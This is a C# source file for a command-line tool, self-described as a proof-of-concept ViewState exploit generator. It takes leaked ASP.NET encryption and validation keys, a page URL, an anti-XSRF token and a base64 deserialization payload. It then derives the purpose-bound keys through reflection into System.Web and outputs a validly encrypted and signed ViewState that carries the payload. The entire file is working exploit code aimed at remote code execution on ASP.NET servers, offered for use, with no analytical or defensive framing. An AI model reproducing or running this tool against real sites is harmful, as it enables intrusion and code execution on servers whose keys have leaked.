using System;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO;
using NDesk.Options;
using System.Collections.Generic;

namespace ViewStatePayloadGenerator
{
    class Program
    {
        static void Main(string[] args)
        {
            // PoC ViewState Exploit Generator using AES and HMACSHA256 (.NET >= 4.5)

            string url = "";
            string antiXsrfToken = "";
            string encryptionKey = "";
            string validationKey = "";
            string payload64 = "";
            byte[] payload = null;

            Boolean show_help = false;

            OptionSet options = new OptionSet()
            {
                {"u|url=", "the url returning the viewstate", v => url = v },
                {"x|antiXsrfToken=", "the XSRF token", v => antiXsrfToken = v },
                {"e|encryptionKey=", "the encryptionKey.", v => encryptionKey = v },
                {"v|validationKey=", "the validationKey", v => validationKey = v },
                {"p|payload=", "the base64 encoded ObjectStateFormatter payload to execute", v => payload64 = v },
                {"h|help", "show this message and exit", v => show_help = v != null },
            };

            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("Viewstate Payload Generator: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try running with '--help' for more information.");
                System.Environment.Exit(-1);
            }

            if (show_help == false && (url == "" || antiXsrfToken == "" || encryptionKey == "" || validationKey == "" || payload64 == ""))
            {
                Console.WriteLine("Missing arguments.");
                show_help = true;
            }

            try
            {
                payload = System.Convert.FromBase64String(payload64);
            } catch (Exception e)
            {
                Console.WriteLine("Payload cannot be decoded from base64");
                System.Environment.Exit(-1);
            }

            // Show help if requested
            if (show_help)
            {
                Console.WriteLine("Viewstate Payload Generator uses leaked encryption and validation keys to generate a RCE payload.");
                Console.WriteLine("");
                Console.WriteLine("Usage: viewstate_generator.exe [options]");
                Console.WriteLine("Options:");
                options.WriteOptionDescriptions(Console.Out);
                System.Environment.Exit(0);
            }
      
            var a = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
            var purposeType = a.GetType("System.Web.Security.Cryptography.Purpose");
            string mainPurpose = "WebForms.HiddenFieldPageStatePersister.ClientState";
            string type = url.TrimStart('/').Replace('/', '_').ToUpper() + "_ASPX";
            string dir = "/" + url.TrimStart('/').Split('/')[0].ToUpper();
            string[] specificPurposes = new String[] { "TemplateSourceDirectory: " + dir, "Type: " + type, "ViewStateUserKey: " + antiXsrfToken };
            object[] parameters = new object[2];
            parameters[0] = mainPurpose;
            parameters[1] = specificPurposes;
            object purpose = Activator.CreateInstance(purposeType, parameters);

            var keyType = a.GetType("System.Web.Security.Cryptography.CryptographicKey");
            object[] parameters2 = new object[1];
            parameters2[0] = StringToByteArray(encryptionKey);
            object encKey = Activator.CreateInstance(keyType, parameters2);
            parameters2[0] = StringToByteArray(validationKey);
            object valKey = Activator.CreateInstance(keyType, parameters2);
            var getMaterialKeyMethod = keyType.GetMethod("GetKeyMaterial");

            var kdfType = a.GetType("System.Web.Security.Cryptography.SP800_108");
            var deriveKeyMethod = kdfType.GetMethod("DeriveKey");
            var derivedEncKey = deriveKeyMethod.Invoke(null, new object[] { encKey, purpose });
            var derivedValKey = deriveKeyMethod.Invoke(null, new object[] { valKey, purpose });

            byte[] finalEncKey = (byte[]) getMaterialKeyMethod.Invoke(derivedEncKey, null);
            byte[] finalValKey = (byte[]) getMaterialKeyMethod.Invoke(derivedValKey, null);

            byte[] result;
            using (SymmetricAlgorithm encryptionAlgorithm = new AesCryptoServiceProvider())
            {
                encryptionAlgorithm.Key = finalEncKey;
                encryptionAlgorithm.GenerateIV();
                byte[] iv = encryptionAlgorithm.IV;

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    memoryStream.Write(iv, 0, iv.Length);
                    using (ICryptoTransform cryptoTransform = encryptionAlgorithm.CreateEncryptor())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(payload, 0, payload.Length);
                            cryptoStream.FlushFinalBlock();
                            using (KeyedHashAlgorithm validationAlgorithm = new HMACSHA256())
                            {
                                validationAlgorithm.Key = finalValKey;
                                byte[] array = validationAlgorithm.ComputeHash(memoryStream.GetBuffer(), 0, checked((int)memoryStream.Length));
                                memoryStream.Write(array, 0, array.Length);
                                result = memoryStream.ToArray();
                            }
                        }
                    }
                }
            }
            string viewstate = Convert.ToBase64String(result);
            Console.WriteLine(viewstate);

            Console.ReadLine();
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
    }
}
